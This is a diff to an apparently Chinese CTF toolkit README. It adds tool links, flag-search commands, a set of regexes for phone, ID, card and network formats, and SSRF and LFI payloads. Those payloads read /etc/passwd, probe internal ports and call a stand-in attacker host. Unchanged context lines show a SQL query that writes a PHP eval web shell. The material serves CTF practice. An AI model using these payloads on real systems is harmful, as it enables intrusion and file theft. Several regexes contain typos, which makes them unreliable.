@@ -40,17 +40,30 @@
 
 ### Misc
 
-- 010 Editor：https://www.sweetscape.com/010editor/
-- Binwalk：https://github.com/ReFirmLabs/binwalk
+#### 图片
+
 - Stegsolve：图片隐写 http://www.caesum.com/handbook/stego.ht
 - 图虫EXIF查看器：https://exif.tuchong.com/
 - 盲水印提取：https://github.com/chishaxie/BlindWaterMark
 - OCR在线识别：https://web.baimiaoapp.com/
-- Audacity：音频隐写 https://www.audacityteam.org/
-- Mp3Stego：Mp3音频隐写 https://www.petitcolas.net/steganography/mp3stego/
-- Pcap流量包在线修复：http://f00l.de/hacking/pcapfix.php
 - 解决拼图问题：montage+gaps https://github.com/nemanja-m/gaps
 - 在线绘制二维码/汉信码：https://www.pixilart.com/draw?ref=home-page
+- 在线扫描一维码：https://online-barcode-reader.inliteresearch.com/
+
+#### 音视频
+
+- Audacity：音频隐写 https://www.audacityteam.org/
+- Mp3Stego：Mp3音频隐写 https://www.petitcolas.net/steganography/mp3stego/
+
+#### 流量分析
+
+- Pcap流量包在线修复：http://f00l.de/hacking/pcapfix.php
+
+#### 数据处理
+
+- 010 Editor：https://www.sweetscape.com/010editor/
+- Binwalk：https://github.com/ReFirmLabs/binwalk
+- 在线正则表达式：https://c.runoob.com/front-end/854/
 
 ### Web
 
@@ -70,7 +83,124 @@
 
 ## Cheatsheet
 
+#### 搜索flag
+
+```
+grep -rn “flag{” /*
+```
+
+```
+find / -type f -name '*' | xargs grep "flag{"
+```
+
 ### Misc
+
+#### 常用正则表达式
+
+##### 中国手机号
+
+- 手机号为11 位10进制数字字符串。
+
+```
+^(13[0-9]|14[01456879]|15[0-35-9]|16[2567]|17[0-8]|18[0-9]|19[0-35-9])\d{8}$
+```
+
+- 带中划线的手机号码
+
+```
+^[+]{0,1}(d){1,3}[ ]?([-]?((d)|[ ]){1,12})+$
+```
+
+##### 电话号码
+
+- "XXX-XXXXXXX"、"XXXX-XXXXXXXX"
+
+```
+(\(\d{3,4}\)|\d{3,4}-|\s)?\d{8}
+```
+
+- "XXX-XXXXXXX"、"XXXX-XXXXXXXX"、"XXX-XXXXXXX"、"XXX-XXXXXXXX"、"XXXXXXX"和"XXXXXXXX"
+
+```
+^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$
+```
+
+- 国内电话号码(0511-4405222、021-87888822)
+
+```
+\d{3}-\d{8}|\d{4}-\d{7}
+```
+
+- 支持手机号码，3-4位区号，7-8位直播号码，1－4位分机号
+
+```
+ ((\d{11})|^((\d{7,8})|(\d{4}|\d{3})-(\d{7,8})|(\d{4}|\d{3})-(\d{7,8})-(\d{4}|\d{3}|\d{2}|\d{1})|(\d{7,8})-(\d{4}|\d{3}|\d{2}|\d{1}))$)
+```
+
+##### 身份证号
+
+- 15位、18位数字，最后一位是校验位，可能为数字或字符X
+
+```
+(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)
+```
+
+##### 国际移动设备识别码（IMEI）
+
+- IMEI（15 位十进制数字：14 位加上一个校验位）用于表示有关设备来源、型号和序列号的信息。
+- 15位由TAC(+FAC) + SNR + CD组成。末尾采用Luhn 校验位。
+
+```
+/^\d{15,17}$/
+```
+
+##### 银行卡号（BankCard）
+
+- 银行卡的长度限制在16-19位。一般信用卡的长度为16位，借记卡的长度为19位。
+- 银行卡号一般有五部分组成：发卡机构标识代码（BIN）、地区代码、卡种类码、顺序码、校验码。
+- 校验码采用Luhn算法计算。
+
+```
+/^([1-9]{1})(\d{15}|\d{18})$/
+```
+
+##### IP地址（IPv4）
+
+- 由四段数字组成，例如192.168.0.1，其中的数字都是十进制的数字，中间用实心圆点分隔。
+
+```
+((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}
+```
+
+```
+((?:(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d?\d))
+```
+
+##### 域名
+
+```
+[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+\.?
+```
+
+```
+^((http:\/\/)|(https:\/\/))?([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}(\/)
+```
+
+##### URL
+
+```
+[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&=]*)?$
+```
+
+##### 邮箱地址（Email）
+
+```
+^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$
+```
+
+```
+^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$
+```
 
 #### tshark流量分析
 
@@ -203,6 +333,41 @@ Give query to execute: select "<?php phpinfo();?>" into outfile "/var/www/html/g
 
 ```
 select "<?php @eval($_POST[c]);?>" into outfile "/var/www/html/gopher.php"
+```
+
+#### SSRF payload
+
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#http)
+
+##### file
+
+```
+file://path/to/file
+file:///etc/passwd
+file://\/\/etc/passwd
+ssrf.php?url=file:///etc/passwd
+
+```
+
+##### http
+
+```
+ssrf.php?url=http://127.0.0.1:22
+ssrf.php?url=http://127.0.0.1:80
+ssrf.php?url=http://127.0.0.1:443
+```
+
+##### dict
+
+```
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+ssrf.php?url=dict://attacker:11111/
+```
+
+#### LFI payload
+
+```
+index.php?path=php://filter/read=convert.base64-encode/resource=flag.php
 ```
 
 ### Reverse
